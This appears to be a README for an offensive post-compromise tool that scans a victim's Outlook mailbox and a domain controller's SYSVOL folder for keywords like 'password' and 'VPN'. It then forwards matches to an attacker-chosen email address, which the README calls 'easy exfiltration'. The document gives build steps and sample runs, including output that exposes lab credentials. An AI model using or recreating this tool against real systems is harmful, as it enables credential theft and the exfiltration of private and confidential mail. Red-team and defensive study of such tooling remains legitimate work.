# ScrapingKit
Scraping Kit is made up of several tools for scraping services for keywords, useful for initial enumeration of Domain Controllers or if you have popped a user's desktop, their outlook client. Each component has a function currently supports scraping and emailing the contents to a designated email address for easy exfiltration.

The kit contains one tool currently with more to come in the coming months and more customisation options.


- Outlook_and_DC_Scraper

## Outlook and DC Scraper (Super Scraper)

### What it is

It helps identify files that contain specific keywords in both emails via the Outlook desk app, and the local domain controller via the Policies and Scripts directories within the SYSVOL folder of an Active Directory domain. It then provides information about the matches and can be used to hunt for potential words such as username and password present in those files.

### How to setup/use

Read this blog post for more detailed information Add-Link

Compile overview

Required NuGet Pakages

1. Right-click on project 'Outlook_and_DC_Scraper' under Solution Explorer and select Manage NuGet Packages.
2. Click on Browse search for the below pakages and install.

```
Microsoft.Office.Interop.Outlook" Version="15.0.4797.1004"
MicrosoftOfficeCore" Version="15.0.0"
System.DirectoryServices" Version="7.0.1"
System.DirectoryServices.AccountManagement" Version="7.0.0"
```

TargetFramework > net6.0

Compile then execute with either PowerShell, CMD or if you have physical access simply double click it.
The following menu screen will load.

```
Please select an option:
1. Run Outlook Email Search
2. Run Active Directory Keyword Search
3. Exit
```


### Example Option 1 using the default keywords

After selecting option 1 you will be requested to add a destination email address, all matches will be forwarded to the added address.
 
```Please select an option:
1. Run Outlook Email Search
2. Run Active Directory Keyword Search
3. Exit
1
Enter the email address to forward matching emails:
dhfrdfdg@REDACTED.com
Would you like to only scrape for the following keywords: 'password', 'security', 'confidential', 'VPN', and 'WIFI' (Y/N)
Y
Matching email found. Forwarded the email information to dhfrdfdg@REDACTED.com
```


### Example Option 1 using user defined keywords

You can select the default keywords or add your own keywords by selecting N at the prompt.

```Please select an option:
1. Run Outlook Email Search
2. Run Active Directory Keyword Search
3. Exit
1
Enter the email address to forward matching emails:
dhfrdfdg@REDACTED.com
Would you like to only scrape for the following keywords: 'password', 'security', 'confidential', 'VPN', and 'WIFI' (Y/N)
n
Enter additional keywords (comma-separated):
happy1
Matching email found. Forwarded the email information to dhfrdfdg@REDACTED.com
```

### Example Option 2 DC scrape with user defined keyword

```
C:\Users\user2>C:\Users\user2\Desktop\Outlook_and_DC_Scraper_Combined.exe
Please select an option:
1. Run Outlook Email Search
2. Run Active Directory Keyword Search
3. Exit
2
Please provide at least one keyword as a command-line argument.
happy
Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Scripts\Test1\Herllo.txt!
Additional keywords found in the context:
user
username
name
username:
username:
Context:
sfsfisfjhsf sfjbsfj sf sf


username: happy1
password: test1
```
